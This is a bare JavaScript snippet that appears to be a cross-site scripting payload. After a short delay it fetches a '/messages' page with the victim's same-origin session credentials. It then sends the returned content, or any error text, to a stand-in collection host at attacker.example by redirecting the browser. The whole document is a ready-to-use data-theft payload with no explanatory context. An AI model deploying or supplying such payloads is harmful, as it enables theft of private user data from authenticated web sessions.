(async function(){
  try {
    await new Promise(r => setTimeout(r, 1500));
    let resp = await fetch("/messages?id=1", {credentials: "same-origin"});
    let text;
    try {
      text = await resp.text();
    } catch (e) {
      text = "[fetch-error] " + e;
    }

    const exfil = "https://attacker.example/collect?d=" + encodeURIComponent(text);
    window.location.href = exfil;

  } catch (err) {    try {
      window.location.href = "https://attacker.example/collect?err=" + encodeURIComponent(err.message);
    } catch (e) {  }
  }
})();
